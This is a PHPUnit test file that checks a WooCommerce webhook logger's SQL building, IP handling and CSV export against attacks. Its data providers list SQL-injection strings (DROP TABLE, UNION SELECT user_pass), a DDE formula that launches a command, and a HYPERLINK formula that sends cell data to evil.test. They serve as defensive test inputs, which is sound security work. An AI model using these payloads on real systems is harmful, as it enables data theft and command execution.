<?php
/**
 * Query-construction, retention, IP-detection and CSV-export tests for
 * WC_Multi_Store_Webhook_Logger.
 *
 * A recording wpdb double implements prepare() with WordPress semantics
 * (%s quoted + escaped, %d cast to int) so every assertion is made on what
 * would really reach MySQL, and on what was kept OUT of the SQL template.
 */

use Brain\Monkey\Functions;

class WebhookLoggerQueriesTest extends WC_Multi_Store_TestCase
{
    /** @var list<array{0:string,1:list<mixed>}> [template, args] for every prepare() */
    private array $prepared = [];

    /** @var list<string> final SQL for every get_var/get_results/get_row/query */
    private array $executed = [];

    /** @var list<array<string,mixed>> */
    private array $inserted = [];

    /** @var array<int, array<string,mixed>> rows returned by get_results */
    private array $rows = [];

    private int $deleteReturn = 3;

    protected function setUp(): void
    {
        parent::setUp();

        $this->prepared     = [];
        $this->executed     = [];
        $this->inserted     = [];
        $this->rows         = [];
        $this->deleteReturn = 3;

        Functions\when('wp_json_encode')->alias(fn($d) => json_encode($d));
        Functions\when('current_time')->justReturn('2024-06-01 10:00:00');
        Functions\when('get_option')->alias(fn(string $o, mixed $d = false) => $d);

        $test = $this;
        global $wpdb;
        $wpdb = new class ($test) extends wpdb {
            public function __construct(private object $t)
            {
            }
            public function prepare(string $query, mixed ...$args): string
            {
                if (isset($args[0]) && is_array($args[0])) {
                    $args = $args[0];
                }
                $this->t->recordPrepare($query, $args);
                $i = 0;
                return preg_replace_callback('/%[sd]/', function ($m) use (&$i, $args) {
                    $v = $args[$i++] ?? '';
                    return $m[0] === '%d' ? (string) (int) $v : "'" . addslashes((string) $v) . "'";
                }, $query);
            }
            public function get_results(string $query, string $output = OBJECT): array|object|null
            {
                $this->t->recordExecuted($query);
                return $this->t->rowsFor($query);
            }
            public function get_var(string $query): mixed
            {
                $this->t->recordExecuted($query);
                return '7';
            }
            public function get_row(string $query, string $output = OBJECT): mixed
            {
                $this->t->recordExecuted($query);
                return null;
            }
            public function query(string $query): int|false
            {
                $this->t->recordExecuted($query);
                return $this->t->deleteReturn();
            }
            public function insert(string $table, array $data, ?array $format = null): int|false
            {
                $this->t->recordInsert($data);
                return 1;
            }
        };
    }

    protected function tearDown(): void
    {
        unset($_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_X_FORWARDED_FOR'], $_SERVER['HTTP_CF_CONNECTING_IP'], $_SERVER['HTTP_X_REAL_IP']);
        parent::tearDown();
    }

    // Callbacks used by the anonymous wpdb (must be public).
    public function recordPrepare(string $q, array $args): void
    {
        $this->prepared[] = [$q, $args];
    }

    public function recordExecuted(string $q): void
    {
        $this->executed[] = $q;
    }

    public function recordInsert(array $d): void
    {
        $this->inserted[] = $d;
    }

    public function rowsFor(string $q): array
    {
        return str_contains($q, 'SELECT *') ? $this->rows : [];
    }

    public function deleteReturn(): int
    {
        return $this->deleteReturn;
    }

    /** @return array{0:string,1:list<mixed>} */
    private function selectPrepare(): array
    {
        foreach ($this->prepared as $p) {
            if (str_contains($p[0], 'SELECT * FROM')) {
                return $p;
            }
        }
        $this->fail('no SELECT * prepare() recorded');
    }

    // ── get_logs: SQL-injection style values ───────────────────────────────

    public static function hostileValues(): array
    {
        return [
            'tautology'        => ["' OR '1'='1"],
            'stacked query'    => ["x'; DROP TABLE wp_users; --"],
            'union select'     => ["' UNION SELECT user_pass FROM wp_users -- "],
            'comment'          => ['x/**/OR/**/1=1'],
            'backslash quote'  => ["\\' OR 1=1 -- "],
            'placeholder text' => ['%s %d %1$s'],
            'null byte'        => ["a\0b"],
            'unicode quote'    => ["\u{02BC} OR 1=1"],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('hostileValues')]
    public function test_hostile_filter_values_only_ever_travel_as_prepare_arguments(string $evil): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs([
            'log_type'    => $evil,
            'store_url'   => $evil,
            'product_sku' => $evil,
            'status'      => $evil,
            'date_from'   => $evil,
            'date_to'     => $evil,
        ]);

        $this->assertNotEmpty($this->prepared);
        foreach ($this->prepared as [$template]) {
            $this->assertStringNotContainsString($evil, $template, 'user input leaked into SQL template');
        }
        // Every executed statement is a prepared one: the evil text only
        // appears inside a quoted literal, never as bare SQL.
        foreach ($this->executed as $sql) {
            $bare = preg_replace("/'(?:[^'\\\\]|\\\\.)*'/s", "''", $sql);
            $this->assertStringNotContainsString('DROP', $bare);
            $this->assertStringNotContainsString('UNION', $bare);
            $this->assertStringNotContainsString('OR 1=1', $bare);
            $this->assertStringNotContainsString('OR/**/', $bare);
        }
    }

    public function test_each_filter_adds_exactly_one_placeholder_and_one_argument(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs([
            'log_type'    => 'stock_deducted',
            'store_url'   => 'shop',
            'product_sku' => 'ABC',
            'status'      => 'failed',
            'date_from'   => '2024-01-01',
            'date_to'     => '2024-01-31',
            'per_page'    => 25,
            'page'        => 3,
        ]);

        [$template, $args] = $this->selectPrepare();
        $this->assertSame(8, preg_match_all('/%[sd]/', $template), 'placeholders');
        $this->assertCount(8, $args);
        $this->assertSame(['stock_deducted', '%shop%', '%ABC%', 'failed', '2024-01-01', '2024-01-31 23:59:59', 25, 50], $args);
    }

    public function test_like_wildcards_in_filters_are_escaped(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs(['store_url' => '100%_off', 'product_sku' => 'a\\b%']);

        [, $args] = $this->selectPrepare();
        $this->assertSame('%100\\%\\_off%', $args[0]);
        $this->assertSame('%a\\\\b\\%%', $args[1]);
    }

    public function test_order_by_and_direction_are_allowlisted(): void
    {
        $evilCols = [
            'created_at; DROP TABLE x',
            '(SELECT SLEEP(5))',
            'id',
            'request_data',
            'created_at DESC, (SELECT 1)',
            '',
            'CREATED_AT',
        ];
        foreach ($evilCols as $col) {
            $this->prepared = [];
            WC_Multi_Store_Webhook_Logger::get_logs(['order_by' => $col, 'order' => 'asc; DROP TABLE x']);
            [$template] = $this->selectPrepare();
            $this->assertStringContainsString('ORDER BY created_at DESC LIMIT', $template, var_export($col, true));
        }
    }

    public function test_allowed_order_columns_are_honoured_and_direction_normalised(): void
    {
        foreach (['created_at', 'log_type', 'store_url', 'product_sku'] as $col) {
            $this->prepared = [];
            WC_Multi_Store_Webhook_Logger::get_logs(['order_by' => $col, 'order' => 'aSc']);
            $this->assertStringContainsString("ORDER BY {$col} ASC LIMIT", $this->selectPrepare()[0]);
        }
    }

    public function test_pagination_numbers_are_bound_as_integers_not_concatenated(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs(['per_page' => '10', 'page' => '2']);

        $sql = end($this->executed);
        $this->assertStringContainsString('LIMIT 10 OFFSET 10', $sql);
        $this->assertStringNotContainsString('DROP', $sql);
    }

    public function test_count_and_select_use_the_same_where_clause(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs(['status' => 'failed', 'log_type' => 'rate_limited']);

        $where = fn(string $s) => preg_replace('/^.*? WHERE (.*?)( ORDER BY.*)?$/s', '$1', $s);
        $count = $this->prepared[0][0];
        $list  = $this->selectPrepare()[0];
        $this->assertStringStartsWith('SELECT COUNT(*)', $count);
        $this->assertSame($where($count), $where($list));
    }

    public function test_unfiltered_query_uses_no_user_values_and_skips_prepare_for_count(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs();

        $this->assertStringContainsString('WHERE 1=1', $this->executed[0]);
        $this->assertCount(1, $this->prepared, 'only the LIMIT/OFFSET query needs preparing');
        $this->assertStringContainsString('LIMIT 50 OFFSET 0', $this->executed[1]);
    }

    public function test_result_metadata_and_json_decoding(): void
    {
        $this->rows = [
            ['id' => 1, 'request_data' => '{"a":1}', 'response_data' => '[1,2]'],
            ['id' => 2, 'request_data' => '{broken', 'response_data' => ''],
            ['id' => 3, 'request_data' => null, 'response_data' => null],
        ];

        $res = WC_Multi_Store_Webhook_Logger::get_logs(['per_page' => 3, 'page' => 1]);

        $this->assertSame(['a' => 1], $res['logs'][0]['request_data']);
        $this->assertSame([1, 2], $res['logs'][0]['response_data']);
        $this->assertNull($res['logs'][1]['request_data'], 'corrupt JSON must decode to null, not throw');
        $this->assertSame('', $res['logs'][1]['response_data']);
        $this->assertSame(7, $res['total']);
        $this->assertEquals(3, $res['pages']);
    }

    // ── get_stats / get_log / deletes ──────────────────────────────────────

    public function test_get_stats_binds_computed_dates_and_log_type(): void
    {
        WC_Multi_Store_Webhook_Logger::get_stats(30);

        $dates = [];
        foreach ($this->prepared as [, $args]) {
            $this->assertMatchesRegularExpression('/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/', (string) $args[0]);
            $dates[] = strtotime($args[0]);
        }
        $this->assertCount(5, $this->prepared);
        $this->assertEqualsWithDelta(time() - 30 * DAY_IN_SECONDS, $dates[0], 5);
        $this->assertEqualsWithDelta(time() - 7 * DAY_IN_SECONDS, $dates[3], 5);
        $this->assertSame('stock_deducted', $this->prepared[4][1][1]);
    }

    public function test_get_log_casts_id_to_int(): void
    {
        WC_Multi_Store_Webhook_Logger::get_log(42);

        $this->assertStringContainsString('WHERE id = 42', end($this->executed));
    }

    public function test_delete_by_status_and_type_bind_user_values(): void
    {
        $evil = "x' OR '1'='1";
        WC_Multi_Store_Webhook_Logger::delete_by_status($evil);
        WC_Multi_Store_Webhook_Logger::delete_by_type($evil);

        foreach ($this->prepared as [$template, $args]) {
            $this->assertStringNotContainsString($evil, $template);
            $this->assertSame([$evil], $args);
        }
        foreach ($this->executed as $sql) {
            $this->assertStringContainsString("\\'", $sql, 'quote must be escaped');
            $this->assertStringContainsString(" = 'x\\' OR \\'1\\'=\\'1'", $sql);
        }
    }

    public function test_delete_older_than_computes_cutoff_from_days(): void
    {
        WC_Multi_Store_Webhook_Logger::delete_older_than(14);

        $cutoff = strtotime($this->prepared[0][1][0]);
        $this->assertEqualsWithDelta(time() - 14 * DAY_IN_SECONDS, $cutoff, 5);
        $this->assertStringStartsWith('DELETE FROM', $this->prepared[0][0]);
    }

    // ── retention cleanup ──────────────────────────────────────────────────

    public function test_cleanup_selects_and_deletes_with_the_same_cutoff_in_that_order(): void
    {
        $this->rows = [['id' => 1, 'created_at' => '2020-01-01 00:00:00', 'log_type' => 'x']];

        WC_Multi_Store_Webhook_Logger::cleanup_old_logs(45);

        $this->assertCount(2, $this->prepared);
        $this->assertStringStartsWith('SELECT * FROM', $this->prepared[0][0]);
        $this->assertStringStartsWith('DELETE FROM', $this->prepared[1][0]);
        $this->assertSame($this->prepared[0][1], $this->prepared[1][1], 'archive and delete must cover the identical window');
        $this->assertEqualsWithDelta(time() - 45 * DAY_IN_SECONDS, strtotime($this->prepared[0][1][0]), 5);
        $this->assertStringContainsString('created_at <', $this->prepared[1][0]);
    }

    public function test_cleanup_uses_default_retention_when_setting_missing(): void
    {
        WC_Multi_Store_Webhook_Logger::cleanup_old_logs();

        $this->assertEqualsWithDelta(
            time() - WC_Multi_Store_Webhook_Logger::DEFAULT_RETENTION_DAYS * DAY_IN_SECONDS,
            strtotime($this->prepared[0][1][0]),
            5
        );
    }

    public function test_cleanup_reads_retention_from_webhook_settings(): void
    {
        Functions\when('get_option')->alias(fn(string $o, mixed $d = false) => $o === 'wc_multi_store_sync_webhook_settings'
            ? ['webhook_log_retention_days' => '7']
            : $d);

        WC_Multi_Store_Webhook_Logger::cleanup_old_logs();

        $this->assertEqualsWithDelta(time() - 7 * DAY_IN_SECONDS, strtotime($this->prepared[0][1][0]), 5);
    }

    public function test_cleanup_returns_number_of_deleted_rows(): void
    {
        $this->deleteReturn = 12;

        $this->assertSame(12, WC_Multi_Store_Webhook_Logger::cleanup_old_logs(30));
    }

    // ── log() ──────────────────────────────────────────────────────────────

    public function test_log_json_encodes_payloads_and_defaults_ip_to_remote_addr(): void
    {
        $_SERVER['REMOTE_ADDR'] = '198.51.100.7';

        WC_Multi_Store_Webhook_Logger::log('x', [
            'request_data'  => ['sku' => "x'; DROP TABLE y;--"],
            'response_data' => ['ok' => true],
        ]);

        $row = $this->inserted[0];
        $this->assertSame('198.51.100.7', $row['request_ip']);
        $this->assertSame('{"sku":"x\'; DROP TABLE y;--"}', $row['request_data']);
        $this->assertSame('{"ok":true}', $row['response_data']);
        $this->assertSame('success', $row['status']);
        $this->assertSame('2024-06-01 10:00:00', $row['created_at']);
    }

    public function test_log_auth_failed_never_records_request_body(): void
    {
        $_SERVER['REMOTE_ADDR'] = '198.51.100.7';

        WC_Multi_Store_Webhook_Logger::log_auth_failed('Invalid custom secret', '198.51.100.7');

        $this->assertNull($this->inserted[0]['request_data']);
        $this->assertSame('failed', $this->inserted[0]['status']);
    }

    public function test_log_order_received_stores_a_summary_not_customer_pii(): void
    {
        WC_Multi_Store_Webhook_Logger::log_order_received([
            'id'         => 9,
            'status'     => 'processing',
            'total'      => '10.00',
            'billing'    => ['email' => 'victim@example.com', 'phone' => '555'],
            'line_items' => [['sku' => 'A', 'name' => 'Thing', 'quantity' => 2, 'meta_data' => ['secret' => 'x']]],
        ], 'https://s.example.com', '198.51.100.7');

        $json = $this->inserted[0]['request_data'];
        $this->assertStringNotContainsString('victim@example.com', $json);
        $this->assertStringNotContainsString('meta_data', $json);
        $this->assertSame('s.example.com', parse_url('https://s.example.com', PHP_URL_HOST));
        $this->assertStringContainsString('s.example.com', $this->inserted[0]['change_reason']);
    }

    // ── client IP resolution ───────────────────────────────────────────────

    private function trustProxy(string $ip): void
    {
        Functions\when('apply_filters')->alias(fn($tag, $value) => $tag === 'wc_mss_trusted_proxies' ? [$ip] : $value);
    }

    public function test_trusted_proxy_cannot_inject_private_or_reserved_client_ips(): void
    {
        $this->trustProxy('203.0.113.1');
        $_SERVER['REMOTE_ADDR'] = '203.0.113.1';

        foreach (['10.0.0.5', '192.168.1.1', '127.0.0.1', '169.254.169.254', '0.0.0.0', 'not-an-ip', "1.2.3.4\r\nX-Evil: 1"] as $spoof) {
            $_SERVER['HTTP_X_FORWARDED_FOR'] = $spoof;
            $this->assertSame('203.0.113.1', WC_Multi_Store_Webhook_Logger::get_client_ip(), $spoof);
        }
    }

    public function test_trusted_proxy_forwarded_ipv6_is_accepted(): void
    {
        $this->trustProxy('203.0.113.1');
        $_SERVER['REMOTE_ADDR'] = '203.0.113.1';
        $_SERVER['HTTP_X_FORWARDED_FOR'] = '2001:db8::1, 203.0.113.1';

        $this->assertSame('2001:db8::1', WC_Multi_Store_Webhook_Logger::get_client_ip());
    }

    public function test_invalid_first_header_falls_through_to_next_valid_header(): void
    {
        $this->trustProxy('203.0.113.1');
        $_SERVER['REMOTE_ADDR'] = '203.0.113.1';
        $_SERVER['HTTP_CF_CONNECTING_IP'] = 'garbage';
        $_SERVER['HTTP_X_REAL_IP'] = '198.51.100.20';

        $this->assertSame('198.51.100.20', WC_Multi_Store_Webhook_Logger::get_client_ip());
    }

    public function test_proxy_headers_ignored_when_peer_is_not_the_trusted_proxy(): void
    {
        $this->trustProxy('203.0.113.1');
        $_SERVER['REMOTE_ADDR'] = '198.51.100.99';
        $_SERVER['HTTP_X_FORWARDED_FOR'] = '8.8.8.8';
        $_SERVER['HTTP_CF_CONNECTING_IP'] = '8.8.4.4';

        $this->assertSame('198.51.100.99', WC_Multi_Store_Webhook_Logger::get_client_ip());
    }

    public function test_malformed_or_missing_remote_addr_collapses_to_placeholder(): void
    {
        foreach (['', 'unknown', '1.2.3.4, 5.6.7.8', '<script>', '999.1.1.1'] as $bad) {
            $_SERVER['REMOTE_ADDR'] = $bad;
            $this->assertSame('0.0.0.0', WC_Multi_Store_Webhook_Logger::get_client_ip(), $bad);
        }
        unset($_SERVER['REMOTE_ADDR']);
        $this->assertSame('0.0.0.0', WC_Multi_Store_Webhook_Logger::get_client_ip());
    }

    // ── CSV export ─────────────────────────────────────────────────────────

    private function row(array $override = []): array
    {
        return array_merge([
            'id' => 1, 'created_at' => '2024-01-01 00:00:00', 'log_type' => 'stock_deducted',
            'store_url' => 'https://s.example.com', 'remote_order_id' => 5, 'product_id' => 9,
            'product_sku' => 'SKU-1', 'old_stock' => 10, 'new_stock' => 8, 'quantity_changed' => -2,
            'change_reason' => 'because', 'request_ip' => '1.2.3.4', 'status' => 'success', 'error_message' => null,
            'request_data' => null, 'response_data' => null,
        ], $override);
    }

    /** RFC 4180 parse (no backslash escape), the way Excel/LibreOffice read the file. */
    private function parseCsv(string $csv): array
    {
        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv, 'UTF-8 BOM for Excel');
        $csv = substr($csv, 3);
        $h = fopen('php://memory', 'r+');
        fwrite($h, $csv);
        rewind($h);
        $rows = [];
        while (($r = fgetcsv($h, null, ',', '"', '')) !== false) {
            $rows[] = $r;
        }
        fclose($h);
        return $rows;
    }

    public static function formulaPrefixes(): array
    {
        return [
            'equals'     => ['=SUM(A1:A9)'],
            'plus'       => ['+1+1'],
            'minus'      => ['-2+3'],
            'at'         => ['@SUM(1)'],
            'tab'        => ["\t=1+1"],
            'cr'         => ["\r=1+1"],
            'dde'        => ['=cmd|\' /C calc\'!A0'],
            'hyperlink'  => ['=HYPERLINK("http://evil.test/?x="&A1,"click")'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('formulaPrefixes')]
    public function test_every_attacker_influenced_text_column_is_neutralised(string $payload): void
    {
        $this->rows = [$this->row([
            'store_url'       => $payload,
            'remote_order_id' => $payload,
            'product_sku'     => $payload,
            'change_reason'   => $payload,
            'request_ip'      => $payload,
            'error_message'   => $payload,
        ])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertCount(2, $rows);
        $this->assertCount(14, $rows[1]);
        foreach ([3, 4, 6, 10, 11, 13] as $col) {
            $this->assertStringStartsWith("'", $rows[1][$col], "column {$col} not neutralised");
            $this->assertSame("'" . $payload, $rows[1][$col]);
        }
    }

    public function test_benign_values_are_not_altered(): void
    {
        $this->rows = [$this->row(['product_sku' => 'SKU-1 = ok', 'change_reason' => 'Stock reduced from 10 to 8', 'error_message' => ''])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertSame('SKU-1 = ok', $rows[1][6]);
        $this->assertSame('Stock reduced from 10 to 8', $rows[1][10]);
        $this->assertSame('', $rows[1][13]);
        $this->assertSame('-2', $rows[1][9], 'numeric stock delta stays numeric');
    }

    public function test_cells_with_commas_quotes_and_newlines_stay_in_one_cell(): void
    {
        $nasty = "line1\nline2, \"quoted\"";
        $this->rows = [$this->row(['change_reason' => $nasty, 'product_sku' => 'A,B'])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertCount(2, $rows, 'embedded newline must not create a new record');
        $this->assertCount(14, $rows[1]);
        $this->assertSame($nasty, $rows[1][10]);
        $this->assertSame('A,B', $rows[1][6]);
    }

    public function test_export_has_header_plus_one_line_per_log_and_forwards_filters(): void
    {
        $this->rows = [$this->row(['id' => 1]), $this->row(['id' => 2]), $this->row(['id' => 3])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv(['status' => 'failed', 'per_page' => 1]));

        $this->assertCount(4, $rows);
        $this->assertCount(14, $rows[0]);
        $this->assertSame(['1', '2', '3'], array_column(array_slice($rows, 1), 0));
        [, $args] = $this->selectPrepare();
        $this->assertSame('failed', $args[0]);
        $this->assertSame(10000, $args[1], 'caller cannot lower or raise the export cap');
    }

    public function test_export_of_unknown_log_type_uses_raw_value_and_is_still_sanitised_by_position(): void
    {
        $this->rows = [$this->row(['log_type' => 'custom_type'])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertSame('custom_type', $rows[1][2]);
    }

    // ── regression fixes ───────────────────────────────────────────────────

    public function test_backslash_quote_payload_stays_in_one_neutralised_cell(): void
    {
        $payload = 'a\\",=HYPERLINK("http://evil.test")';
        $this->rows = [$this->row(['product_sku' => $payload, 'error_message' => $payload, 'change_reason' => $payload])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertCount(2, $rows);
        $this->assertCount(14, $rows[1], 'payload must not spill into extra columns');
        $this->assertSame($payload, $rows[1][6]);
        $this->assertSame($payload, $rows[1][10]);
        $this->assertSame($payload, $rows[1][13]);
        foreach ($rows[1] as $i => $cell) {
            $this->assertFalse(str_starts_with($cell, '='), "column {$i} starts with a formula");
        }
    }

    public function test_leading_formula_plus_backslash_quote_is_prefixed_and_contained(): void
    {
        $payload = '=1+1\\",=2+2';
        $this->rows = [$this->row(['product_sku' => $payload])];

        $rows = $this->parseCsv(WC_Multi_Store_Webhook_Logger::export_csv());

        $this->assertCount(14, $rows[1]);
        $this->assertSame("'" . $payload, $rows[1][6]);
    }

    public static function zeroStringFilters(): array
    {
        return [
            'log_type'    => ['log_type', 'log_type = %s'],
            'product_sku' => ['product_sku', 'product_sku LIKE %s'],
            'status'      => ['status', 'status = %s'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('zeroStringFilters')]
    public function test_zero_string_is_a_real_filter_value(string $key, string $fragment): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs([$key => '0']);

        [$template, $args] = $this->selectPrepare();
        $this->assertStringContainsString($fragment, $template);
        $this->assertContains(str_contains($fragment, 'LIKE') ? '%0%' : '0', $args);
    }

    public function test_empty_string_and_null_filters_are_still_ignored(): void
    {
        WC_Multi_Store_Webhook_Logger::get_logs(['log_type' => '', 'product_sku' => null, 'status' => '', 'store_url' => null]);

        $this->assertStringContainsString('WHERE 1=1 ORDER BY', $this->selectPrepare()[0]);
    }

    public static function badPagination(): array
    {
        return [
            'zero per_page'     => [0, 1, 1, 0],
            'negative per_page' => [-5, 1, 1, 0],
            'zero page'         => [10, 0, 10, 0],
            'negative page'     => [10, -3, 10, 0],
            'both zero'         => [0, 0, 1, 0],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('badPagination')]
    public function test_per_page_and_page_are_clamped_to_at_least_one(int $perPage, int $page, int $limit, int $offset): void
    {
        $res = WC_Multi_Store_Webhook_Logger::get_logs(['per_page' => $perPage, 'page' => $page]);

        $this->assertStringContainsString("LIMIT {$limit} OFFSET {$offset}", end($this->executed));
        $this->assertGreaterThanOrEqual(1, $res['per_page']);
        $this->assertGreaterThanOrEqual(1, $res['page']);
    }

    public static function unsafeRetentionDays(): array
    {
        return [
            'zero'     => [0],
            'negative' => [-30],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('unsafeRetentionDays')]
    public function test_explicit_non_positive_retention_falls_back_to_default(int $days): void
    {
        WC_Multi_Store_Webhook_Logger::cleanup_old_logs($days);

        $this->assertEqualsWithDelta(
            time() - WC_Multi_Store_Webhook_Logger::DEFAULT_RETENTION_DAYS * DAY_IN_SECONDS,
            strtotime($this->prepared[0][1][0]),
            5
        );
    }

    public static function garbageRetentionOption(): array
    {
        return [
            'text'     => ['abc'],
            'zero'     => ['0'],
            'negative' => ['-9'],
            'empty'    => [''],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('garbageRetentionOption')]
    public function test_garbage_retention_option_never_wipes_recent_logs(mixed $value): void
    {
        Functions\when('get_option')->alias(fn(string $o, mixed $d = false) => $o === 'wc_multi_store_sync_webhook_settings'
            ? ['webhook_log_retention_days' => $value]
            : $d);

        WC_Multi_Store_Webhook_Logger::cleanup_old_logs();

        $cutoff = strtotime($this->prepared[0][1][0]);
        $this->assertEqualsWithDelta(
            time() - WC_Multi_Store_Webhook_Logger::DEFAULT_RETENTION_DAYS * DAY_IN_SECONDS,
            $cutoff,
            5
        );
    }
}
